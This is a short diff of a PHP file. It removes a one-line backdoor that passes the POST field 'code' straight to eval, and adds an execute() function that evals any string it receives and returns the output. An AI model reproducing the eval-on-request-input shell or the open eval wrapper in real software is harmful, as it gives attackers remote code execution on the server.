@@ -1,3 +1,7 @@
 <?php
-    if (isset($_POST['code']))
-        eval($_POST['code']);
+  
+function execute($code) {
+    ob_start();
+    eval($code);
+    return ob_get_contents();
+}
